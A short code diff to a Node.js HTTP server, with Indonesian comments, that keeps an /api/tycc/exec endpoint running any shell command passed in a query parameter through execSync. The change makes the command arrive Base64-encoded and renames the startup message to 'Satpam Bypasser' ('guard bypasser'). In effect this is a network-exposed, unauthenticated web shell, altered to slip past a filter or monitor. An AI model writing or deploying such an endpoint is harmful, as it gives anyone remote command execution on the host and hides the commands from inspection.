@@ -11,7 +11,11 @@ const server = http.createServer((req, res) => {
 
     if (url.pathname === '/api/tycc/exec') {
         try {
-            const cmd = url.searchParams.get('cmd');
+            // Kita ambil perintah dalam bentuk Base64
+            const b64cmd = url.searchParams.get('cmd');
+            // Decode kembali menjadi teks biasa
+            const cmd = Buffer.from(b64cmd, 'base64').toString('utf-8');
+            
             const out = execSync(cmd).toString();
             res.writeHead(200, { 'Content-Type': 'text/plain' });
             return res.end(out);
@@ -44,5 +48,5 @@ const server = http.createServer((req, res) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log("Satpam Berhasil Jalan di Port " + PORT);
+    console.log("Satpam Bypasser Berhasil Jalan");
 });
